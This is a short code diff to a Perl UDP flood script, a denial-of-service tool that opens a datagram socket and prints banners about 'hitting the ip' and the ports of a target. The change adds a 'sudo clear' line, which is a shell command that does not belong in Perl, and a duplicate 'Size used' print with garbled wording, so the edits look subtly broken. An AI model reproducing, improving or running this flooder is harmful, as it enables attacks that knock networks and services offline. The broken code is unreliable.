@@ -44,6 +44,7 @@ $iaddr = inet_aton("$ip") or die "Cant resolve the hostname try again $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
+sudo clear
 printf "[0;32m>> Made by DeriVer  \n"; 
 printf "[0;31m>> hitting the ip    \n";
 printf "[0;36m>> hitting the ports     \n";
@@ -54,6 +55,7 @@ printf "Interpacket delay $delay msec\n" if $delay;
 printf "total IP bandwidth $bw kbps\n" if $bw;
 print "[0;32mIp used : [0;31m$ip \n";
 print "[0;32mSize used : [0;31m$size \n";
+print "[0;32mSize used : [0;31m$size-byte bytes \n";
 print "[0;32mTime used : [0;31m$endtime \n";
 print "[0;32mPort used : [0;31m$port \n";
 print "[0;32mDelay used : [0;31m$delay \n";
